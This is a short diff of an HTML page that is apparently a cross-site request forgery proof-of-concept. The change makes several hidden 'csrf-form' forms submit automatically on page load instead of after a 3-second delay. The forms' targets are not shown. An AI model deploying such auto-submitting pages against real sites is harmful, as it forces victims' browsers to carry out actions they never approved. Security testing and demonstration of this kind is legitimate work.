@@ -72,8 +72,7 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  
     <script>
-      function submit_forms() {
-        $(document).ready(async function () {
+        $(document).ready(function () {
           $("#csrf-form1").submit();
           $("#csrf-form2").submit();
           $("#csrf-form3").submit();
@@ -84,8 +83,7 @@
         // document.getElementById(`csrf-form3`).submit();
         // document.getElementById(`csrf-form4`).submit();
         // document.getElementById(`csrf-form5`).submit();
-      }
-      setTimeout(submit_forms, 3000)
+      // setTimeout(submit_forms, 3000)
     </script>
   </body>
 
